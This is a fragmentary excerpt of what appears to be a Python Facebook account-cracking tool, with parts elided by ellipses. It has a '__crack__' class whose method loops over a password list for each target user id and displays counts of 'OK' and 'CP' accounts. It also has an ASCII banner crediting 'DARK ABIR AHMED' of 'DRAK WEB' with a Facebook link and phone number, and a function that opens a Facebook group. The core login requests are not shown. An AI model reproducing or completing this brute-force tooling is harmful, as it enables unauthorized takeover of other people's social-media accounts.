...
def readline___Public_Xml():
	...
	if key in [""]:
		...
		time.sleep(0.5)
		print (" [•] Search : Fb Search / Abir Ahmed")
	elif key in ["0", "00"]:
		exit("\n [✓] Thank you so much♥️\n")
	else:
		exit()
...
class __crack__:
	...
	def __api__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;97m [ABIR 😪] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
...
\033[1;91mO))      O)))) O))        O))     O))O))O))      O))  O)))))
 ...
 [*]=============================================
    Author           :  \033[1;93mDARK ABIR AHMED 
    \033[1;92mFacebook.        : https://www.facebook.com/Abir.lg17289
    \033[1;94mTeam             : DRAK WEB 👿👈
    \033[1;93m❤ WhatsApp        : 01730853768
 [*]=============================================
...
def dupcutter():
	os.system("xdg-open https://www.facebook.com/groups/2370009543137160/?ref=share")
	time.sleep(3)
	readline___Public_Xml()
def sep():
	logo()
